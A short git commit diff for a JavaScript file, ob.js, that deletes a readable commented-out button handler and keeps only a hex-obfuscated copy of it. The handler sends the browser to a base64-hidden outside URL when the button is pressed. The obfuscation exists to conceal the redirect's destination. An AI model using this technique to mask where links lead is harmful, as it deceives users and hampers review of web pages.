7e4f890c719291dac3c4816cafd1aa5b356dfb7a
myNEWmac <boriskaborisenko@gmail.com>
2018-10-09 13:21:32 +0300

    obfuscation

--- ob.js
+++ ob.js
@@ -1,10 +1,1 @@
-/*
-const btn = document.getElementById('btn');
-const ahha = 'aHR0cDovL3NlY3VyaXgudG9w';
-btn.onpointerdown = handleDown;
-function handleDown(evt) {
- window.location.href = atob(ahha); 
-}
-*/
-
 var _0x5781=["\x62\x74\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x61\x48\x52\x30\x63\x44\x6F\x76\x4C\x33\x4E\x6C\x59\x33\x56\x79\x61\x58\x67\x75\x64\x47\x39\x77","\x6F\x6E\x70\x6F\x69\x6E\x74\x65\x72\x64\x6F\x77\x6E","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E"];const btn=document[_0x5781[1]](_0x5781[0]);const ahha=_0x5781[2];btn[_0x5781[3]]= handleDown;function handleDown(_0xd2f4x4){window[_0x5781[5]][_0x5781[4]]= atob(ahha)}
